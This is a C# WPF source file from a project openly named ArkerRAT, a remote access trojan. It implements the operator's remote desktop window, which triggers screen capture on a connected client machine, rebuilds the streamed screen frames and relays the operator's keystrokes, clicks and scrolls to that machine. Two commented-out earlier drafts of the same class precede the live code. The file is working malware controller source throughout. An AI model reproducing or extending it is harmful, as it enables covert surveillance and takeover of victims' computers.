////using ArkerRAT1;
////using System;
////using System.Collections.Concurrent;
////using System.Collections.Generic;
////using System.Drawing;
////using System.Drawing.Imaging;
////using System.IO;
////using System.Linq;
////using System.Text;
////using System.Threading;
////using System.Threading.Tasks;
////using System.Windows;
////using System.Windows.Controls;
////using System.Windows.Data;
////using System.Windows.Documents;
////using System.Windows.Input;
////using System.Windows.Media;
////using System.Windows.Media.Animation;
////using System.Windows.Media.Imaging;
////using System.Windows.Shapes;

////namespace ArkerRatWpfVersion
////{
////    /// <summary>
////    /// Interaction logic for RemoteDesktopWindow.xaml
////    /// </summary>
////    public partial class RemoteDesktopWindow : Window
////    {
////        public RATHostSession clientSession { get; set; }
////        //A thread safe alternative for lists, and won get out of index.
////        private Thread _frameRetrieverThread;
////        public bool _isRunning = false;

////        public RemoteDesktopWindow(RATHostSession session)
////        {
////            InitializeComponent();
////            clientSession = session;
////            clientSession.SendData("§RemoteDesktopStart§§RemoteDesktopEnd§");
////            clientSession.remoteDesktopWindowIsAlreadyOpen = true;
////        }

////        private async void CloseWindow(object sender, RoutedEventArgs e)
////        {
////            Close();
////            clientSession.SendData("§RemoteDesktopStart§§RemoteDesktopEnd§");
////            clientSession.remoteDesktopWindowIsAlreadyOpen = false;
////        }

////        private void MaximizeWindow(object sender, RoutedEventArgs e)
////        {

////        }

////        private void MinimizeWindow(object sender, RoutedEventArgs e)
////        {
////            this.WindowState = WindowState.Minimized;
////        }

////        private void Window_MouseDown(object sender, MouseButtonEventArgs e)
////        {
////            if (e.LeftButton == MouseButtonState.Pressed)
////            {
////                DragMove();
////            }
////        }
////        //_______________________________________________________________________________



////        public void OnNewFrameRecieved(string chunk)
////        {
////            lock(GlobalVariables._lock)
////            {
////                _frameHandler.AddChunk(chunk);
////            }
////        }

////    }



////}

//using ArkerRAT1;
//using System;
//using System.Collections.Generic;
//using System.Drawing.Imaging;
//using System.IO;
//using System.Threading;
//using System.Threading.Tasks;
//using System.Windows;
//using System.Windows.Controls;
//using System.Windows.Input;
//using System.Windows.Media;
//using System.Windows.Media.Animation;
//using System.Windows.Media.Imaging;

//namespace ArkerRatWpfVersion
//{
//    /// <summary>
//    /// Interaction logic for RemoteDesktopWindow.xaml
//    /// </summary>
//    public partial class RemoteDesktopWindow : Window
//    {
//        public RATHostSession clientSession { get; set; }

//        public RemoteDesktopWindow(RATHostSession session)
//        {
//            InitializeComponent();
//            clientSession = session;
//            GlobalVariables.byteSize = 262144;
//            lock (GlobalVariables._lock)
//            {
//                clientSession.data = string.Empty;
//            }
//            clientSession.SendData("§RemoteDesktopStart§§RemoteDesktopEnd§");
//            clientSession.remoteDesktopWindowIsAlreadyOpen = true;
//            this.PreviewKeyDown += new KeyEventHandler(SendKeystrokesToClient);
//            this.PreviewMouseWheel+= new MouseWheelEventHandler(SendScrollToClient);
//            remoteDesktopVideoFrame.Stretch= Stretch.Fill;
//        }

//        private async void SendScrollToClient(object sender, MouseWheelEventArgs e)
//        {
//            e.Handled = true; // Mark the event as handled to prevent it from bubbling up to the window

//            Point relativeClickPos = e.GetPosition(remoteDesktopVideoFrame);

//            double clickX = relativeClickPos.X * Convert.ToDouble(clientSession.resulotion[1]) / remoteDesktopVideoFrame.ActualWidth;
//            double clickY = relativeClickPos.Y * Convert.ToDouble(clientSession.resulotion[0]) / remoteDesktopVideoFrame.ActualHeight;

//            await clientSession.SendData("§RemoteDesktopStart§§ClickPositionStart§" + Convert.ToString(clickX) + "," + Convert.ToString(clickY) + "," + e.Delta.ToString() + "§ClickPositionEnd§§RemoteDesktopEnd§");
//        }
//        private async void SendKeystrokesToClient(object sender, KeyEventArgs e)
//        {
//            e.Handled = true;
//            await clientSession.SendData("§RemoteDesktopStart§" + "§KI§"+e.Key.ToString().ToLower()+"§RemoteDesktopEnd§");
//        }

//        private async void CloseWindow(object sender, RoutedEventArgs e)
//        {
//            clientSession.SendData("§RemoteDesktopStart§close§RemoteDesktopEnd§");
//            clientSession.remoteDesktopWindowIsAlreadyOpen = false;
//            GlobalVariables.byteSize = 1024;
//            Close();
//        }

//        bool zoom = true;
//        private void MaximizeWindow(object sender, RoutedEventArgs e)
//        {
//            if (zoom)
//            {
//                this.Width = this.Width * 2;
//                this.Height = this.Height * 2;
//                zoom = false;
//            }
//            else
//            {
//                this.Width = this.Width /2;
//                this.Height = this.Height / 2;
//                zoom= true;
//            }

//        }

//        private void MinimizeWindow(object sender, RoutedEventArgs e)
//        {
//            this.WindowState = WindowState.Minimized;
//        }

//        private async void ImageControl_PreviewMouseDown(object sender, MouseButtonEventArgs e)
//        {
//            e.Handled = true; // Mark the event as handled to prevent it from bubbling up to the window

//            Point relativeClickPos = e.GetPosition(remoteDesktopVideoFrame);

//            double clickX = relativeClickPos.X * Convert.ToDouble(clientSession.resulotion[1]) / remoteDesktopVideoFrame.ActualWidth;
//            double clickY = relativeClickPos.Y * Convert.ToDouble(clientSession.resulotion[0]) / remoteDesktopVideoFrame.ActualHeight;

//            await clientSession.SendData("§RemoteDesktopStart§§ClickPositionStart§" + Convert.ToString(clickX) + "," + Convert.ToString(clickY)+","+e.ChangedButton.ToString() + "§ClickPositionEnd§§RemoteDesktopEnd§");
//        }

//        private void Window_MouseDown(object sender, System.Windows.Input.MouseButtonEventArgs e)
//        {
//            if (e.LeftButton == System.Windows.Input.MouseButtonState.Pressed)
//            {
//                DragMove();
//            }
//        }

//        private MemoryStream _frameStream = new MemoryStream();

//        public async void ReceiveFrameChunk(string frameChunk)
//        {
//            if (frameChunk == "§RemoteDesktopFrameDone§")
//            {
//                byte[] frameBytes = CombineFrameChunks();
//                _frameStream.SetLength(0); // Reset the stream

//                await Application.Current.Dispatcher.InvokeAsync(() =>
//                {
//                    try
//                    {
//                        BitmapImage bitmapImage = new BitmapImage();
//                        bitmapImage.BeginInit();
//                        bitmapImage.CacheOption = BitmapCacheOption.OnLoad;
//                        bitmapImage.StreamSource = new MemoryStream(frameBytes);
//                        bitmapImage.EndInit();

//                        remoteDesktopVideoFrame.Source = bitmapImage;
//                    }
//                    catch (Exception ex) { }
//                });
//            }
//            else
//            {
//                try
//                {
//                    byte[] chunkBytes = Convert.FromBase64String(frameChunk);
//                    await _frameStream.WriteAsync(chunkBytes, 0, chunkBytes.Length);
//                }
//                catch (Exception ex) { return; }
//            }
//        }

//        private byte[] CombineFrameChunks()
//        {
//            byte[] frameBytes = _frameStream.ToArray();
//            return frameBytes;
//        }

//    }
//}
//using ArkerRAT1;
//using System;
//using System.Collections.Concurrent;
//using System.Collections.Generic;
//using System.Drawing;
//using System.Drawing.Imaging;
//using System.IO;
//using System.Linq;
//using System.Text;
//using System.Threading;
//using System.Threading.Tasks;
//using System.Windows;
//using System.Windows.Controls;
//using System.Windows.Data;
//using System.Windows.Documents;
//using System.Windows.Input;
//using System.Windows.Media;
//using System.Windows.Media.Animation;
//using System.Windows.Media.Imaging;
//using System.Windows.Shapes;

//namespace ArkerRatWpfVersion
//{
//    /// <summary>
//    /// Interaction logic for RemoteDesktopWindow.xaml
//    /// </summary>
//    public partial class RemoteDesktopWindow : Window
//    {
//        public RATHostSession clientSession { get; set; }
//        //A thread safe alternative for lists, and won get out of index.
//        private Thread _frameRetrieverThread;
//        public bool _isRunning = false;

//        public RemoteDesktopWindow(RATHostSession session)
//        {
//            InitializeComponent();
//            clientSession = session;
//            clientSession.SendData("§RemoteDesktopStart§§RemoteDesktopEnd§");
//            clientSession.remoteDesktopWindowIsAlreadyOpen = true;
//        }

//        private async void CloseWindow(object sender, RoutedEventArgs e)
//        {
//            Close();
//            clientSession.SendData("§RemoteDesktopStart§§RemoteDesktopEnd§");
//            clientSession.remoteDesktopWindowIsAlreadyOpen = false;
//        }

//        private void MaximizeWindow(object sender, RoutedEventArgs e)
//        {

//        }

//        private void MinimizeWindow(object sender, RoutedEventArgs e)
//        {
//            this.WindowState = WindowState.Minimized;
//        }

//        private void Window_MouseDown(object sender, MouseButtonEventArgs e)
//        {
//            if (e.LeftButton == MouseButtonState.Pressed)
//            {
//                DragMove();
//            }
//        }
//        //_______________________________________________________________________________



//        public void OnNewFrameRecieved(string chunk)
//        {
//            lock(GlobalVariables._lock)
//            {
//                _frameHandler.AddChunk(chunk);
//            }
//        }

//    }



//}

using ArkerRAT1;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Drawing.Imaging;
using System.IO;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Animation;
using System.Windows.Media.Imaging;

namespace ArkerRatWpfVersion
{
    /// <summary>
    /// Interaction logic for RemoteDesktopWindow.xaml
    /// </summary>
    public partial class RemoteDesktopWindow : Window
    {
        public RATHostSession clientSession { get; set; }

        public RemoteDesktopWindow(RATHostSession session)
        {
            InitializeComponent();
            clientSession = session;
            GlobalVariables.byteSize = 262144;
            lock (GlobalVariables._lock)
            {
                clientSession.data = string.Empty;
            }

            Buffer();
            //ResetWhenTheDelayOfFramesIsToLarge();

            clientSession.SendData("§RemoteDesktopStart§§RemoteDesktopEnd§");
            clientSession.remoteDesktopWindowIsAlreadyOpen = true;
            this.PreviewKeyDown += new KeyEventHandler(SendKeystrokesToClient);
            this.PreviewMouseWheel += new MouseWheelEventHandler(SendScrollToClient);
            remoteDesktopVideoFrame.Stretch = Stretch.Fill;


        }

        private async void SendScrollToClient(object sender, MouseWheelEventArgs e)
        {
            e.Handled = true; // Mark the event as handled to prevent it from bubbling up to the window

            Point relativeClickPos = e.GetPosition(remoteDesktopVideoFrame);

            double clickX = relativeClickPos.X * Convert.ToDouble(clientSession.resulotion[1]) / remoteDesktopVideoFrame.ActualWidth;
            double clickY = relativeClickPos.Y * Convert.ToDouble(clientSession.resulotion[0]) / remoteDesktopVideoFrame.ActualHeight;

            await clientSession.SendData("§RemoteDesktopStart§§ClickPositionStart§" + Convert.ToString(clickX) + "," + Convert.ToString(clickY) + "," + e.Delta.ToString() + "§ClickPositionEnd§§RemoteDesktopEnd§");
        }
        private async void SendKeystrokesToClient(object sender, KeyEventArgs e)
        {
            e.Handled = true;
            await clientSession.SendData("§RemoteDesktopStart§" + "§KI§"+e.Key.ToString().ToLower()+"§RemoteDesktopEnd§");
        }

        private async void CloseWindow(object sender, RoutedEventArgs e)
        {
            clientSession.SendData("§RemoteDesktopStart§close§RemoteDesktopEnd§");
            clientSession.remoteDesktopWindowIsAlreadyOpen = false;
            GlobalVariables.byteSize = 1024;
            Close();
        }

        bool zoom = true;
        private void MaximizeWindow(object sender, RoutedEventArgs e)
        {
            if (zoom)
            {
                this.Width = this.Width * 2;
                this.Height = this.Height * 2;
                zoom = false;
            }
            else
            {
                this.Width = this.Width / 2;
                this.Height = this.Height / 2;
                zoom = true;
            }

        }

        private void MinimizeWindow(object sender, RoutedEventArgs e)
        {
            this.WindowState = WindowState.Minimized;
        }

        private async void ImageControl_PreviewMouseDown(object sender, MouseButtonEventArgs e)
        {
            e.Handled = true; // Mark the event as handled to prevent it from bubbling up to the window

            Point relativeClickPos = e.GetPosition(remoteDesktopVideoFrame);

            double clickX = relativeClickPos.X * Convert.ToDouble(clientSession.resulotion[1]) / remoteDesktopVideoFrame.ActualWidth;
            double clickY = relativeClickPos.Y * Convert.ToDouble(clientSession.resulotion[0]) / remoteDesktopVideoFrame.ActualHeight;

            await clientSession.SendData("§RemoteDesktopStart§§ClickPositionStart§" + Convert.ToString(clickX) + "," + Convert.ToString(clickY)+","+e.ChangedButton.ToString() + "§ClickPositionEnd§§RemoteDesktopEnd§");
        }

        private void Window_MouseDown(object sender, System.Windows.Input.MouseButtonEventArgs e)
        {
            if (e.LeftButton == System.Windows.Input.MouseButtonState.Pressed)
            {
                DragMove();
            }
        }

        public ConcurrentQueue<string> frameQue = new ConcurrentQueue<string>();
        private async void Buffer()
        {
           await Task.Run(async() => 
           {
               while (!clientSession.source.IsCancellationRequested && clientSession.remoteDesktopWindowIsAlreadyOpen)
               {
                   string temp = string.Empty;
                   frameQue.TryDequeue(out temp);

                   if (!string.IsNullOrEmpty(temp))
                   {
                       ReceiveFrameChunk(temp);
                   }
                   await Task.Delay(1);
               }
           });
        }

        private MemoryStream _frameStream = new MemoryStream();
        public async void ReceiveFrameChunk(string frameChunk)
        {
            if (frameChunk.Contains("§RemoteDesktopFrameDone§"))
            {
                byte[] frameBytes = CombineFrameChunks();
                _frameStream.SetLength(0); // Reset the stream

                await Application.Current.Dispatcher.InvokeAsync(() =>
                {
                    try
                    {
                        BitmapImage bitmapImage = new BitmapImage();
                        bitmapImage.BeginInit();
                        bitmapImage.CacheOption = BitmapCacheOption.OnLoad;
                        bitmapImage.StreamSource = new MemoryStream(frameBytes);
                        bitmapImage.EndInit();

                        remoteDesktopVideoFrame.Source = bitmapImage;
                    }
                    catch (Exception ex) { }
                });
            }
            else
            {
                try
                {
                    byte[] chunkBytes = Convert.FromBase64String(frameChunk);
                    await _frameStream.WriteAsync(chunkBytes, 0, chunkBytes.Length);

                    //if (_frameStream.Length > 100000)
                    //{
                    //    var sendDataTask = clientSession.SendData("§RemoteDesktopStart§close§RemoteDesktopEnd§");
                    //    sendDataTask.Wait();
                    //    clientSession.remoteDesktopWindowIsAlreadyOpen = false;
                    //    frameQue = new ConcurrentQueue<string>();
                    //    _frameStream.SetLength(0);
                    //    clientSession.data = string.Empty;
                    //    var _sendDataTask = clientSession.SendData("§RemoteDesktopStart§§RemoteDesktopEnd§");
                    //    sendDataTask.Wait();
                    //    clientSession.remoteDesktopWindowIsAlreadyOpen = true;
                    //}
                }
                catch (Exception ex) { return; }
            }
        }

        //private async Task ResetWhenTheDelayOfFramesIsToLarge()
        //{
        //    while (!clientSession.source.IsCancellationRequested && clientSession.remoteDesktopWindowIsAlreadyOpen)
        //    {
        //        string[] tempQue = frameQue.ToArray();
        //        int length = 0;
        //        foreach (var item in tempQue)
        //        {
        //            length += item.Length;
        //        }
        //        lock (GlobalVariables._lock)
        //        {
        //            if (length > 800000 || clientSession.data.Length > 800000)
        //            {
        //                var sendDataTask = clientSession.SendData("§RemoteDesktopStart§close§RemoteDesktopEnd§");
        //                sendDataTask.Wait(); frameQue = new ConcurrentQueue<string>();
        //                clientSession.data = string.Empty;
        //                clientSession.SendData("§RemoteDesktopStart§§RemoteDesktopEnd§");
        //            }
        //        }

        //        await Task.Delay(3000);
        //    }
        //}

        private byte[] CombineFrameChunks()
        {
            byte[] frameBytes = _frameStream.ToArray();
            return frameBytes;
        }

    }
}
